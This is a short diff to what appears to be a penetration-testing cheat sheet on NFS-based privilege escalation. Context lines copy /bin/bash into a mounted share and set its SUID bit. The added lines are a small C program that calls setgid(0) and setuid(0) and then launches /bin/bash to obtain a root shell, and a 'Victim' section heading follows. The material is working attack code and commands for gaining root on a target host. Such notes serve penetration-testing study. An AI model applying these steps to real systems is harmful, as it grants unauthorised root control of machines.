@@ -38,6 +38,18 @@ cd /tmp/mount
 cp /bin/bash .
 chmod +s bash
 ```
+```
+# C Code:
+#include <unistd.h>  // for setuid() and setgid()
+#include <stdlib.h>  // for system()
+
+int main() {
+    setgid(0);
+    setuid(0);
+    system("/bin/bash");
+    return 0;
+}
+```
 ### 🎯Victim
 ```
 Victim
